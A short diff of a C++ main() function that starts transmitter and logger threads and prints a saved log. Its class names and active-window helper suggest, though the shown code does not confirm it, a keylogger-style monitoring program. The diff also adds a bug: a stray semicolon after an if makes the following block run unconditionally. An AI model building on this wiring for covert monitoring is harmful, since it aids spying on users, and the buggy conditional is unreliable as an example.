@@ -16,19 +16,20 @@ int main()
 	Transmitter transmitter(&logger);
 
 	// Start Transmitter thread
-	Thread thread(&Transmitter::Start, &transmitter);
-	thread.launch();
+	Thread thread_transmitter(&Transmitter::Start, &transmitter);
+	thread_transmitter.launch();
 
-	// Test Utilities static methods
-	cout << Utilities::GetCurrentDate() << endl;
-	cout << Utilities::GetTime() << endl;
-	cout << Utilities::GetActiveWindow() << endl;
-	cout << Utilities::GetProgramFilePath() << endl;
-	cout << Utilities::GetSystemDir() << endl;
+	// Start Logger thread
+	Thread thread_logger(&Logger::Update, &logger);
+	thread_logger.launch();
+
 	
 	// If available load log from file and display it to screen 
 	if(logger.LoadFromFile());
+	{
+		cout << "Loaded from file" << endl;
 		cout << logger.GetLog() << endl;
+	}
 
 	// Start listening
 	listener.Start();
